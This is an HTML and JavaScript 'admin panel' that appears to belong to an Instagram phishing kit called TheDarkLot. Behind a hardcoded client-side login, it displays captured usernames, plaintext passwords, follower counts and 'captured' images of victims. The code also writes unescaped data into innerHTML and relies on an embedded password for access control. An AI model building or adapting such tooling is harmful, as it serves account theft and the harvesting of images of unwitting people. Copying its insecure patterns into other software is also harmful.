<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Admin Panel | TheDarkLot</title>
  <style>
    body {
      background: #0f0f0f;
      font-family: Arial, sans-serif;
      color: #fff;
      padding: 20px;
      margin: 0;
    }
    .login-box, .panel {
      max-width: 400px;
      margin: 80px auto;
      background: #1a1a1a;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,255,149,0.2);
    }
    h1, h2 {
      color: #00ff95;
      text-align: center;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      background: #0f0f0f;
      color: #fff;
      border: 1px solid #00ff95;
      border-radius: 5px;
    }
    button {
      width: 100%;
      padding: 10px;
      background: #00ff95;
      border: none;
      border-radius: 5px;
      color: #000;
      font-weight: bold;
      cursor: pointer;
    }
    .entry {
      background: #1a1a1a;
      padding: 15px;
      border-radius: 10px;
      margin-bottom: 15px;
      box-shadow: 0 0 10px rgba(0,255,149,0.3);
    }
    img {
      max-width: 100px;
      border-radius: 5px;
    }
    .meta {
      font-size: 14px;
      margin-top: 5px;
      color: #ccc;
    }
  </style>
</head>
<body>

<div class="login-box" id="login-box">
  <h2>Admin Login</h2>
  <form id="login-form">
    <input type="text" id="username" placeholder="Username" required />
    <input type="password" id="password" placeholder="Password" required />
    <button type="submit">Login</button>
  </form>
</div>

<div id="panel" class="panel" style="display:none;">
  <h1>üìã InstaPanel Admin Dashboard</h1>
  <div id="entries">Loading data...</div>
</div>

<script>
  const USER = "admin";
  const PASS = "thedarklot@2025";

  const loginForm = document.getElementById("login-form");
  const loginBox = document.getElementById("login-box");
  const panel = document.getElementById("panel");

  loginForm.onsubmit = function(e) {
    e.preventDefault();
    const user = document.getElementById("username").value.trim();
    const pass = document.getElementById("password").value.trim();

    if (user === USER && pass === PASS) {
      loginBox.style.display = "none";
      panel.style.display = "block";
      loadData();
    } else {
      alert("‚ùå Incorrect username or password!");
    }
  };

  function loadData() {
    const container = document.getElementById('entries');
    const allData = JSON.parse(localStorage.getItem("insta_users") || "[]");

    if (allData.length === 0) {
      container.innerHTML = "<p>No data available yet.</p>";
      return;
    }

    container.innerHTML = '';
    allData.reverse().forEach(entry => {
      const div = document.createElement('div');
      div.className = 'entry';
      div.innerHTML = `
        <strong>Username:</strong> @${entry.username}<br>
        <strong>Password:</strong> ${entry.password}<br>
        <strong>Followers:</strong> ${entry.followers}<br>
        <div class="meta">üì∏ Captured Image:</div>
        <img src="${entry.image}" alt="Snap">
        <div class="meta">üïí ${entry.timestamp}</div>
      `;
      container.appendChild(div);
    });
  }
</script>

</body>
</html>
